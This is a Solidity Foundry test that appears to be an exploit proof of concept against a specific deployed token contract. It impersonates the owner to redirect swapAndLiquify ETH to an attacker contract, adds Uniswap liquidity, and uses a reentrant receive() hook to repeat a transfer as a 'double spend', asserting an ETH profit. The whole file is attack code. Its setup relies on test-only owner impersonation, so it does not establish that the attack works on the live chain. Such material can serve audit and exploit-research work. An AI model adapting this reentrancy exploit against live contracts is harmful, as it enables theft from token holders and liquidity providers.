pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface JizzJet {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Router() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    JizzJet internal victim;
    address internal owner;
    uint256 internal amountToTriggerLiquify;
    bool internal reentered = false;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        victim = JizzJet(TARGET);
        owner = victim.owner();

        deal(address(this), 100 ether);

        amountToTriggerLiquify = 1e18;

        vm.startPrank(owner);
        // Set the attacker contract as the admin wallet to receive ETH from swapAndLiquify
        victim._setReceiverWallet(payable(address(this)));
        // Transfer tokens to the victim contract to meet the swapAndLiquify threshold
        victim.transfer(TARGET, amountToTriggerLiquify);
        // Transfer tokens to the attacker for the double-spend attack
        victim.transfer(address(this), amountToTriggerLiquify * 2);
        vm.stopPrank();

        // Add liquidity to the pair to allow swaps to happen
        IUniswapV2Router02 router = IUniswapV2Router02(victim.uniswapV2Router());
        victim.approve(address(router), type(uint256).max);
        router.addLiquidityETH{value: 20 ether}(
            TARGET,
            amountToTriggerLiquify * 2,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        victim.transfer(makeAddr("recipient"), amountToTriggerLiquify);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Re-enter the transfer function to perform a double spend
            victim.transfer(makeAddr("recipient"), amountToTriggerLiquify);
        }
    }
}

